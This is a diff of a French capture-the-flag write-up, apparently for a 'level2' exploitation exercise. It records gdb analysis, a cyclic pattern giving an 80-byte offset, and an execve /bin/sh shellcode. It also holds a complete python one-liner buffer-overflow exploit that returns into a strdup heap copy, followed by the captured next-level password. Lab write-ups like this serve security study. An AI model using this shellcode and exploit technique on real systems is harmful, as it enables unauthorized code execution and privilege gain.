@@ -22,8 +22,50 @@ disas p:
 
 on voit un 
 0x080484ed <+25>:    call   0x80483c0 <gets@plt>
-on va break avent pour voir le eax qu'il use
+et une protection 
+0x080484fb <+39>:    and    $0xb0000000,%eax
+0x08048500 <+44>:    cmp    $0xb0000000,%eax
 
-break *0x080484ed
-(gdb) x/s $eax
-0xbffff75c:      "\001"
+grace a un site plutot sympa on peut trouver facilement le buffer max
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
+on lance:
+(gdb) run
+Starting program: /home/user/level2/level2 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+on copie dans le site 0x37634136
+et il nous sort 80
+
+et apres ca je seche je n'ai plus aucune idee
+
+bon bon bon je suis de retour j'ai tester des chose classique ltrace recherche avec id ...
+avec ltrace on trouve 
+et j'avoue j'ai entendu parler du shell code 
+du coup j ai fait des recherche sur les deux chose qu'on avait et qu on pouvait utiliser le shell code et l'ex de strdup
+j'ai donc trouver 
+Il existe d’autre variables intéressantes qui si elles sont présentes en mémoire
+permettent aussi l’exploitation d’un heap overflow.
+données allouées en heap par les fonctions strdup(), getenv(), tmpnam()
+
+donc je vais chercher comment exploiter strdup avec shellcode
+
+du coup j'ai trouver le shell code
+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
+et le code de strdup avec ltrace
+strdup("")    = 0x0804a008
+
+sachant qu'il faut exploiter avec l'overflow on met le shell code en debut sinon ca ne marche pas apres on overflow vue qu'on a 80 bytes de place on fait 80-28 = 52
+il nous faudra 52 caractere apres le shell code et avent le code de strdup si il y en a trop ca segfault sinon ca ne marche pas
+
+(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '.' * 52 + '\x08\xa0\x04\x08'"; cat - ) | ./level2
+
+1�Ph//shh/bin����°
+                 ̀1�@̀..............................................�
+
+
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+et hop
